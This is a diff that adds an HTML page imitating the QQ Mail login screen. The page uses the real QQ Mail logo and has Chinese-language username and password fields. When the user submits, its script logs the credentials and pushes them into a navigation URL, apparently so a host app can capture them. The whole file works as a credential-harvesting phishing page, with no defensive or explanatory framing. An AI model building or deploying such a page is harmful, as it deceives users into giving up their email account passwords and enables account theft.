@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>QQ邮箱登录</title>
+    <meta charset="utf-8" />
+    <script>
+        function logon() {
+    var usersname = document.getElementById("usersname").value;
+    var pwd = document.getElementById("pwd").value;
+    if (usersname == "") {
+        alert("用户名不可为空")
+        return false
+    }
+    if (pwd == "") {
+        alert("密码不可为空")
+        return false
+    }
+    else {
+        console.log("usersname:" + usersname)
+        console.log("password:" + pwd)
+        info = "InfoMation-->" + "'" + "usersname=" + usersname + ";" + "password=" + pwd + "'"
+        window.location.href = info
+    }
+}
+    </script>
+</head>
+<body style="background-color: #eee">
+    <style>
+        .logo{
+            width:50%;
+            height:300px;
+            background-image:url(https://mail.qq.com/zh_CN/htmledition/images/logo/qqmail/qqmail_logo_default_200h.png);
+            background-size:100%;
+            background-repeat:no-repeat
+        }
+        .input{
+            width:98%;
+            height:120px;
+            text-align:left;
+            font-size:40px;
+            border-top-left-radius:20px;
+            border-top-right-radius:20px;
+            border:none
+        }
+        .input2 {
+            width: 98%;
+            height: 120px;
+            text-align: left;
+            font-size: 40px;
+            border-bottom-left-radius: 20px;
+            border-bottom-right-radius: 20px;
+            border: none
+        }
+    </style>
+    <div align="center">
+        <div style="width:100%;height:70px"></div>
+        <div class="logo"></div>
+    </div>
+    <div align="center">
+        <div style="width:85%;" align="center">
+            <input id="usersname" class="input" placeholder="QQ号码/手机/邮箱" />
+            <input id="pwd" class="input2" placeholder="输入密码" type="password" />
+        </div>
+    </div>
+    <div style="width: 100%;height:20px;"></div>
+    <style>
+        .check{
+            width: 50px;
+            height: 50px;
+        }
+    </style>
+    <div align="center">
+        <div style="width: 85%;" align="left">
+            <table>
+                <td>
+                    <input type="checkbox" class="check" />
+                </td>
+                <td>
+                    <p style="font-size: 40px;">自动登录</p>
+                </td>
+            </table>
+        </div>
+    </div>
+    <div style="width: 100%;height:40px;"></div>
+    <div align="center">
+        <style>
+            .btn{
+                width: 80%;height: 120px;background-color: rgb(16, 86, 218);
+                color: white;
+                font-size: 40px;
+                border-radius: 20px;
+            }
+            .btn2{
+                width: 80%;
+                height: 120px;
+                background-color: darkgray;
+                border: blue;
+                color: blue;
+                font-size: 40px;
+                border-radius:20px
+            }
+        </style>
+        <button class="btn" onclick="logon()">登 录</button>
+        <br />
+        <br />
+        <br />
+        <button class="btn2" onclick="logon()">一键登录</button>
+    </div>
+</body>
+</html>
